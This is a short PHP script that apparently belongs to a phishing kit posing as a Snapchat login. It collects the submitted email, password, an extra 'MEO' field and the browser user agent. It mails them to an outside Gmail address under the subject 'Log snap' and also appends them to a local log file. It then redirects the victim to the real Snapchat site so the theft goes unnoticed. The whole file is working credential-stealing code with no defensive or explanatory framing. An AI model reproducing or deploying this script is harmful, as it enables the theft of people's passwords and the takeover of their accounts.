<?php
 
$message = "
📧Email : ".$_POST['username']."
📧Mot De Passe : ".$_POST['password']."
📧 MEO: ".$_POST['Eyes']."
📧User Agent: ".$_SERVER["HTTP_USER_AGENT"]."
";
$Subject="👻 Log snap ".$_POST['username']." ✨";
$head="From: λbeloth 🖤  <login>";
mail("abelothigohq@gmail.com",$Subject,$message,$head);
$fil = fopen('Trex.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_one']  = true;
header('Location:https://www.snapchat.com/'); ?>
